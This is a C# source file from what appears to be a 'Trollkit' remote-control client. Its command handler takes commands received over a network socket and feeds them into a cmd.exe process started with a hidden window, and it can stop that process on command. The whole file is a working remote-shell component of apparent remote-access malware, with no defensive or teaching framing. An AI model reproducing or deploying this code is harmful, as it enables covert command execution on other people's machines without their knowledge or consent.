using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Trollkit_Library;
using Trollkit_Library.Models;

namespace Trollkit_Client.Modules.CommandHandlers
{
	public class CMDHandler : ICommandHandler
	{
		Process p;
		private StreamWriter Writer { get { return p.StandardInput; } }

		public override bool HandleCommand(Socket s, TransferCommandObject obj)
		{
			switch (obj.Command)
			{
				case "ExecuteCMD":
					GetCommandResponse(obj.Value);
					return true;

				case "StopCMD":
					StopProcess();
					break;
			}
			return false;
		}


		private void StartOrCreateProcess()
		{
			if(p == null)
			{
				p = new Process();
				ProcessStartInfo startInfo = new ProcessStartInfo();
				startInfo.WindowStyle = ProcessWindowStyle.Hidden;
				startInfo.FileName = "cmd.exe";
				startInfo.UseShellExecute = false;
				startInfo.RedirectStandardOutput = true;
				startInfo.RedirectStandardInput = true;
				p.StartInfo = startInfo;
				p.Start();
				p.OutputDataReceived += P_OutputDataReceived;
				p.BeginOutputReadLine();
			}

			if (p.HasExited)
			{
				p.Start();
			}
		}

		private void StopProcess()
		{
			if(p != null)
			{
				p.CancelOutputRead();
				p.Kill();
				p.Close();
			}
		}

		private void P_OutputDataReceived(object sender, DataReceivedEventArgs e)
		{
			BConsole.WriteLine(e.Data, ConsoleColor.Cyan);
		}

		private string GetCommandResponse(string command)
		{
			StartOrCreateProcess();
			Writer.WriteLine(command);			
			return "End Of Command";
		}
	}
}
